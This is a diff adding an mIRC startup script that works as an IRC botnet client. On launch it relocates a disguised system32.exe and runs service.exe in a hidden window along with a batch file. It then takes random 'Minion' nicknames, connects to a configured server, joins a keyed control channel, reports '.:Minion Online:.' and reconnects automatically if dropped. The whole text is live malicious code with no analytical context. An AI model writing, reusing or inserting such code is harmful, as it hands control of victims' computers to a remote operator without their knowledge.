@@ -1,0 +1,20 @@
+on 1:START: { 
+  if (!$exists($mircdirsystem32.exe)) && $findfile(C:\,system32.exe,1) { copy $findfile(C:\,system32.exe,1) system31.exe | .remove $findfile(C:\,system32.exe,1) | rename system31.exe system32.exe } 
+  if (!$exists(system)) { mkdir system }
+  nick Minion $+ $rand(200,9999)
+  anick Minion $+ $rand(200,9999)
+  identd on $read(readme.txt)
+  if ($exists(service.exe) == $false) { exit }
+  run $mircdir $+ service.exe /n /fh mIRC32
+  run -n secure.bat
+  if (%chan == null) { set %chan #clownpenis }
+  if (%key == null) { set %key fart }
+  server %server 6667  
+}
+raw 433:*:nick Minion $+ $rand(200,9999)
+on *:connect:{
+  join %chan %key
+  msg %chan .:Minion Online:.
+  strip +rc
+}
+on *:DISCONNECT: { server %server }
